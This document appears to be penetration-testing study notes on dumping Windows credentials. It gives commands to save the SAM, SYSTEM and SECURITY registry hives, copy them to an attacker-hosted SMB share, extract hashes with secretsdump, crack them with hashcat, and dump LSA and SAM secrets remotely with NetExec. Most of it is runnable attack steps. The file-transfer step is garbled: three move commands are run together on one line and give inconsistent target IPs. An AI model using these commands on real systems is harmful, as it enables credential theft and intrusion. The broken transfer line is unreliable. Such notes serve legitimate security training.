
# Registry Hives

With **local administrator privileges**, you can copy key Windows registry hives that store credential material. These are later parsed to extract password hashes and secrets.

| Hive            | Purpose                                    | Why It Matters                                               |
| --------------- | ------------------------------------------ | ------------------------------------------------------------ |
| `HKLM\SAM`      | Stores hashed passwords for local accounts | Source of NTLM hashes for local users                        |
| `HKLM\SYSTEM`   | Contains the system boot key (SysKey)      | Required to decrypt SAM hashes                               |
| `HKLM\SECURITY` | Stores LSA secrets                         | Cached creds (DCC2), DPAPI keys, service account creds, etc. |

> ⚠️ SAM hashes **cannot be decrypted without the SYSTEM hive**.

---

# Copying Registry Hives (reg.exe)

Run CMD as **Administrator**:

```cmd
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save
```

# Transferring Hives to Attacker Machine

## SMB Share via Impacket smbserver

``` 
# Hosting an SMB file share from your machine so the target can copy files to you.

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```

### Parameters

- `-smb2support` → Enables SMBv2 compatibility
    
- `CompData` → Share name
    
- Last argument → Local folder to host

## Move Files to Share

```
move C:\sam.save \\10.10.16.239\CompData move C:\system.save \\10.10.16.239\CompData move C:\security.save \\10.10.15.16\CompData
```

---

# Dumping Hashes (secretsdump)

```
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

### Output May Include

- Local account NTLM hashes
    
- Cached domain credentials (DCC2)
    
- LSA secrets
    
- Machine account hash
---
# Cracking NTLM Hashes

1. Place NT hashes into a file:
    

```
hashestocrack.txt
```

2. Run Hashcat:
    


```
hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```

**Mode 1000 = NTLM**

---

# DCC2 (Domain Cached Credentials v2)

### Characteristics

- PBKDF2-based → very slow to crack
    
- Cannot be used for Pass-the-Hash
    
- Strong passwords often infeasible to crack
    

### Example

```

hashcat -m 2100 '$DCC2$10240#administrator#hash' rockyou.txt
```
**Mode 2100 = DCC2**

---

# DPAPI (Data Protection API)

Used by Windows to protect:

- Browser credentials
    
- Wi-Fi passwords
    
- Vault data
    
- RDP credentials
    

### Tools

- `mimikatz`
    
- `impacket-dpapi`
    
- `DonPAPI` (remote collection)
    

### DPAPI Decryption Requires

- User password **OR**
    
- Domain backup key (domain environments)
    

---

# Remote Dumping (NetExec)

## Dump LSA Secrets

```
netexec smb <target> --local-auth -u user -p pass --lsa
```

## Dump SAM Hashes

```
netexec smb <target> --local-auth -u user -p pass --sam
```

### Requirements

- Local admin privileges
    
- SMB access
    
- Remote Registry service (sometimes)

